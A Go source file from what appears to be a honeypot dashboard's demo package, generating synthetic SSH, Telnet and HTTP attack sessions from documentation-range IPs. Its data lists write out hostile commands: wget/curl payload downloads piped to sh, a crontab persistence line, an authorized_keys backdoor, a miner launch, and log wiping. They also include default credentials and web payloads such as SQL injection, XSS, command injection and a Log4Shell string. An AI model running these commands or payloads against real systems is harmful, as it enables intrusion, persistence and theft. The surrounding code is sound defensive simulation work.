// Package demo produces synthetic attack traffic so the dashboard can be
// shown without exposing a real server. Source addresses come only from the
// RFC 5737 documentation ranges, so no real host is ever named as an attacker;
// locations are drawn from a fixed list of cities.
package demo

import (
	"context"
	"fmt"
	"math/rand/v2"
	"time"

	"github.com/born2feel/honeynet/internal/detect"
	"github.com/born2feel/honeynet/internal/event"
	"github.com/born2feel/honeynet/internal/honeypot"
	"github.com/born2feel/honeynet/internal/shell"
)

// Sink is what the generator writes to (the recorder's blocking Submit).
type Sink func(context.Context, event.Event) error

type city struct {
	cc, country, name string
	lat, lon          float64
	weight            int
}

// Rough shape of real honeypot traffic: a few countries dominate.
var cities = []city{
	{"CN", "China", "Beijing", 39.90, 116.40, 14}, {"CN", "China", "Shanghai", 31.23, 121.47, 10},
	{"CN", "China", "Shenzhen", 22.54, 114.06, 6}, {"US", "United States", "Ashburn", 39.04, -77.49, 10},
	{"US", "United States", "San Jose", 37.34, -121.89, 5}, {"US", "United States", "Dallas", 32.78, -96.80, 4},
	{"RU", "Russia", "Moscow", 55.76, 37.62, 7}, {"RU", "Russia", "Saint Petersburg", 59.93, 30.36, 3},
	{"BR", "Brazil", "São Paulo", -23.55, -46.63, 5}, {"IN", "India", "Mumbai", 19.08, 72.88, 5},
	{"IN", "India", "Bengaluru", 12.97, 77.59, 3}, {"KR", "South Korea", "Seoul", 37.57, 126.98, 4},
	{"VN", "Vietnam", "Hanoi", 21.03, 105.85, 4}, {"DE", "Germany", "Frankfurt", 50.11, 8.68, 4},
	{"NL", "Netherlands", "Amsterdam", 52.37, 4.90, 4}, {"SG", "Singapore", "Singapore", 1.35, 103.82, 3},
	{"ID", "Indonesia", "Jakarta", -6.21, 106.85, 3}, {"IR", "Iran", "Tehran", 35.69, 51.39, 2},
	{"TW", "Taiwan", "Taipei", 25.03, 121.57, 2}, {"FR", "France", "Paris", 48.86, 2.35, 2},
	{"GB", "United Kingdom", "London", 51.51, -0.13, 2}, {"UA", "Ukraine", "Kyiv", 50.45, 30.52, 2},
	{"TR", "Turkey", "Istanbul", 41.01, 28.98, 2}, {"MX", "Mexico", "Mexico City", 19.43, -99.13, 1},
	{"AR", "Argentina", "Buenos Aires", -34.60, -58.38, 1}, {"ZA", "South Africa", "Johannesburg", -26.20, 28.05, 1},
	{"EG", "Egypt", "Cairo", 30.04, 31.24, 1}, {"JP", "Japan", "Tokyo", 35.68, 139.69, 2},
	{"TH", "Thailand", "Bangkok", 13.76, 100.50, 1}, {"PK", "Pakistan", "Karachi", 24.86, 67.01, 1},
	{"NG", "Nigeria", "Lagos", 6.52, 3.38, 1}, {"HK", "Hong Kong", "Hong Kong", 22.32, 114.17, 2},
}

var (
	usernames         = []string{"root", "root", "root", "admin", "admin", "ubuntu", "user", "test", "oracle", "postgres", "pi", "git", "ftpuser", "deploy", "support", "guest", "mysql", "hadoop", "debian", "centos"}
	passwords         = []string{"123456", "password", "admin", "root", "12345678", "1234", "qwerty", "toor", "123", "1qaz2wsx", "admin@123", "P@ssw0rd", "raspberry", "ubuntu", "test123", "changeme", "Huawei@123", "111111", "abc123", "passw0rd", "root@2024", "server", "letmein", "welcome1", "alpine", "Aa123456", "zaq12wsx", "Admin123!"}
	clients           = []string{"SSH-2.0-Go", "SSH-2.0-Go", "SSH-2.0-libssh_0.9.6", "SSH-2.0-libssh2_1.10.0", "SSH-2.0-PuTTY_Release_0.80", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-AsyncSSH_2.14.2"}
	telnetCredentials = [][2]string{{"root", "xc3511"}, {"root", "vizxv"}, {"admin", "admin"}, {"root", "888888"}, {"root", "default"}, {"support", "support"}, {"root", "hi3518"}, {"user", "user"}, {"root", "root"}, {"admin", "1234"}}

	// Command scripts modelled on what real bots run after login.
	scripts = [][]string{
		{"uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m | grep Mem", "whoami", "ls -la /tmp"},
		{"cd /tmp || cd /var/run || cd /dev/shm; wget http://198.51.100.23/bins/x86_64; chmod +x x86_64; ./x86_64 ssh", "rm -rf x86_64", "history -c"},
		{"cat /etc/os-release", "nproc", "lscpu | grep Model", "crontab -l", "echo '*/5 * * * * curl -fsSL http://203.0.113.77/a.sh | sh' | crontab -"},
		{"cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D mdrfckr\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh"},
		{"uname -m", "cd /dev/shm; curl -O http://192.0.2.44/xmrig.tar.gz; tar xzf xmrig.tar.gz", "./xmrig -o stratum+tcp://pool.example.net:3333 -u 4ABC --donate-level 1 -B", "pkill -f kdevtmpfsi"},
		{"echo -e \"\\x6F\\x6B\"", "ps aux | grep -v grep | grep miner", "w", "uptime"},
		{"ls /", "cat /etc/passwd", "id", "exit"},
	}
	telnetScripts = [][]string{
		{"enable", "system", "shell", "sh", "/bin/busybox ECCHI"},
		{"cd /tmp; tftp -g -r mips 198.51.100.8; chmod 777 mips; ./mips telnet.mips", "/bin/busybox MIRAI"},
		{"cat /proc/mounts; /bin/busybox SORA", "/bin/busybox wget http://203.0.113.200/sora.sh -O- | sh"},
	}
	httpPaths = []string{
		"/", "/", "/.env", "/.git/config", "/wp-login.php", "/xmlrpc.php", "/wp-admin/setup-config.php", "/phpmyadmin/index.php",
		"/admin", "/login", "/actuator/env", "/server-status", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>/tmp/x)", "/boaform/admin/formLogin",
		"/index.php?id=1%27%20UNION%20SELECT%201,2,database()--%20-", "/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
		"/../../../../etc/passwd", "/HNAP1/", "/GponForm/diag_Form?images/", "/shell?cd+/tmp;wget+http://198.51.100.9/jaws;sh+jaws",
		"/robots.txt", "/config.json", "/.aws/credentials", "/api/v1/pods", "/owa/auth/logon.aspx", "/solr/admin/info/system",
	}
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"python-requests/2.31.0", "Go-http-client/1.1", "curl/7.88.1", "Mozilla/5.0 zgrab/0.x",
		"Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)", "Hello World", "Mozilla/5.0 (l9scan/2.0.)",
		"${jndi:ldap://198.51.100.66:1389/Exploit}", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
	}
)

// attacker is a synthetic source: a documentation-range IP pinned to a city.
type attacker struct {
	ip  string
	geo event.Geo
}

type Generator struct {
	rng       *rand.Rand
	attackers []attacker
	hostname  string
}

func New(hostname string, seed uint64) *Generator {
	g := &Generator{rng: rand.New(rand.NewPCG(seed, seed^0x9e3779b97f4a7c15)), hostname: hostname}
	total := 0
	for _, c := range cities {
		total += c.weight
	}
	nets := []string{"192.0.2", "198.51.100", "203.0.113"}
	for i := range 600 {
		pick := g.rng.IntN(total)
		var c city
		for _, c = range cities {
			if pick -= c.weight; pick < 0 {
				break
			}
		}
		g.attackers = append(g.attackers, attacker{
			ip: fmt.Sprintf("%s.%d", nets[i%3], 1+(i/3)%254),
			geo: event.Geo{
				CountryCode: c.cc, Country: c.country, City: c.name,
				Lat: c.lat + (g.rng.Float64()-0.5)*0.6, Lon: c.lon + (g.rng.Float64()-0.5)*0.6,
			},
		})
	}
	return g
}

func (g *Generator) pick(xs []string) string { return xs[g.rng.IntN(len(xs))] }

// zipf-ish: a handful of noisy attackers produce most of the traffic.
func (g *Generator) attacker() attacker {
	i := int(float64(len(g.attackers)) * g.rng.Float64() * g.rng.Float64() * g.rng.Float64())
	return g.attackers[i]
}

// Backfill writes history spread over the last d.
func (g *Generator) Backfill(ctx context.Context, sink Sink, d time.Duration, sessions int) error {
	now := time.Now().UTC()
	for range sessions {
		// More traffic at "night" in the attacker-heavy timezones gives the timeline a shape.
		off := time.Duration(g.rng.Float64() * float64(d))
		at := now.Add(-off)
		if h := at.Hour(); (h < 6 || h > 20) && g.rng.IntN(3) == 0 {
			at = at.Add(-time.Duration(g.rng.IntN(3)) * time.Hour)
		}
		if err := g.session(ctx, sink, at); err != nil {
			return err
		}
	}
	return nil
}

// Live emits a new synthetic session every interval on average until ctx ends.
func (g *Generator) Live(ctx context.Context, sink Sink, interval time.Duration) error {
	for {
		wait := time.Duration(g.rng.ExpFloat64() * float64(interval))
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(wait):
		}
		if err := g.session(ctx, sink, time.Now().UTC()); err != nil {
			return nil
		}
	}
}

func (g *Generator) session(ctx context.Context, sink Sink, at time.Time) error {
	switch r := g.rng.IntN(100); {
	case r < 50:
		return g.ssh(ctx, sink, at)
	case r < 65:
		return g.telnet(ctx, sink, at)
	default:
		return g.http(ctx, sink, at)
	}
}

func (g *Generator) emitter(ctx context.Context, sink Sink, at *time.Time) func(event.Event) error {
	return func(e event.Event) error {
		e.Time = *at
		*at = at.Add(time.Duration(200+g.rng.IntN(1800)) * time.Millisecond)
		return sink(ctx, e)
	}
}

func (g *Generator) ssh(ctx context.Context, sink Sink, at time.Time) error {
	return g.interactive(ctx, sink, at, event.SensorSSH, func() (string, string) {
		return g.pick(usernames), g.pick(passwords)
	}, scripts, g.pick(clients))
}

func (g *Generator) telnet(ctx context.Context, sink Sink, at time.Time) error {
	return g.interactive(ctx, sink, at, event.SensorTelnet, func() (string, string) {
		c := telnetCredentials[g.rng.IntN(len(telnetCredentials))]
		return c[0], c[1]
	}, telnetScripts, "")
}

func (g *Generator) interactive(ctx context.Context, sink Sink, at time.Time, sensor event.Sensor,
	cred func() (string, string), scripts [][]string, client string) error {
	a := g.attacker()
	base := event.Event{Sensor: sensor, SessionID: honeypot.NewSessionID(), SrcIP: a.ip, SrcPort: 30000 + g.rng.IntN(35000), Geo: a.geo}
	emit := g.emitter(ctx, sink, &at)

	e := base
	e.Kind = event.KindConnect
	if err := emit(e); err != nil {
		return err
	}
	attempts := 1 + g.rng.IntN(6)
	var user string
	loggedIn := false
	for i := 1; i <= attempts && !loggedIn; i++ {
		u, p := cred()
		ok := honeypot.AcceptLogin(u, p, i) && g.rng.IntN(3) == 0
		e := base
		e.Kind, e.Username, e.Password, e.Success, e.Client, e.Detail = event.KindAuth, u, p, ok, client, "password"
		if err := emit(e); err != nil {
			return err
		}
		user, loggedIn = u, ok
	}
	if loggedIn {
		sh := shell.New(g.hostname, user)
		for _, line := range scripts[g.rng.IntN(len(scripts))] {
			res := sh.Exec(line)
			e := base
			e.Kind, e.Command, e.Output, e.Tags = event.KindCommand, line, detect.Truncate(res.Output, 4096), detect.Command(line)
			if urls := detect.URLs(line); len(urls) > 0 {
				e.Detail = urls[0]
			}
			if err := emit(e); err != nil {
				return err
			}
			if res.Exit {
				break
			}
		}
		if sensor == event.SensorSSH && g.rng.IntN(8) == 0 {
			e := base
			e.Kind, e.Detail = event.KindTunnel, g.pick([]string{"smtp.example.com:25", "ipinfo.io:443", "mail.example.org:587"})
			if err := emit(e); err != nil {
				return err
			}
		}
	}
	e = base
	e.Kind = event.KindDisconnect
	return emit(e)
}

func (g *Generator) http(ctx context.Context, sink Sink, at time.Time) error {
	a := g.attacker()
	emit := g.emitter(ctx, sink, &at)
	for range 1 + g.rng.IntN(5) {
		p := g.pick(httpPaths)
		method, body, ua := "GET", "", g.pick(userAgents)
		e := event.Event{Sensor: event.SensorHTTP, Kind: event.KindRequest, SrcIP: a.ip, SrcPort: 40000 + g.rng.IntN(20000), Geo: a.geo}
		if p == "/wp-login.php" && g.rng.IntN(2) == 0 {
			method = "POST"
			e.Username, e.Password = g.pick([]string{"admin", "administrator", "wp_admin", "editor"}), g.pick(passwords)
			body = "log=" + e.Username + "&pwd=" + e.Password + "&wp-submit=Log+In"
		}
		e.Method, e.Path, e.UserAgent, e.Body = method, p, ua, body
		e.Tags = detect.HTTP(method, p, body, ua)
		if e.Username != "" {
			e.Tags = append(e.Tags, "credential_capture")
		}
		if err := emit(e); err != nil {
			return err
		}
	}
	return nil
}
